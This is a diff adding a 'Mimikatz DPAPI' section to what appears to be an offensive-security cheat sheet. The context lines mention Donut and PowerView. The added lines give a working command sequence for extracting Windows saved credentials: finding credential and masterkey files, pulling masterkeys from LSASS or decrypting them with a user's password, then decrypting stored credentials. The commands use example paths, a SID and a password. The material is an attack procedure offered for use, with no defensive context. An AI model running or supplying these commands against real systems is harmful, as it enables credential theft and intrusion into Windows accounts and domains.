@@ -44,6 +44,26 @@ Donut
   sudo make
   Donut-maker: https://github.com/Hackplayers/Salsa-tools/blob/master/Donut-Maker/donut-maker.py
   
+Mimikatz DPAPI
+  Credential files are located at C:\Users\user\AppData\Local\Microsoft\Credentials\ (Vaults, etc..)
+      Example: c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
+  Get masterkey GUID
+      mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9
+      Example:  guidMasterKey : {7dc6a492-36e2-4c2d-be66-ba29d263dda2}
+  Check if decrypted masterkey is in LSASS
+       mimikatz !sekurlsa::dpapi
+  Locate encrypted masterkey if not in lsass
+      Encrypted masterkeys are located at: c:\users\username\AppData\Roaming\Microsoft\Protect\
+      Example: c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2
+  Decrypte masterkey
+      mimikatz dpapi::masterkey /in:"c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2" /rpc
+      or
+      mimikatz dpapi::masterkey /in:"c:\users\epugh\AppData\Roaming\Microsoft\Protect\S-1-5-21-1396373213-2872852198-2033860859-1151\7dc6a492-36e2-4c2d-be66-ba29d263dda2" /sids:S-1-5-21-1396373213-2872852198-2033860859-1151 /password:Sarah2017 /protected
+      Copy masterkey; key : dcd70638e50e3bcec7cd7fb888399748.......
+  Decrypt Credential File
+      mimikatz dpapi::cred /in:c:\users\epugh\AppData\Local\Microsoft\Credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:dcd70638e50e3bcec7cd7fb8......
+      
+  
 PowerView
   Trusts: Get-DomainTrust -SearchBase “GC://$($ENV:USERDNSDOMAIN)”
   Trust Mapping: Get-DomainTrustMapping to | Export-CSV -NoTypeInformation trusts.csv
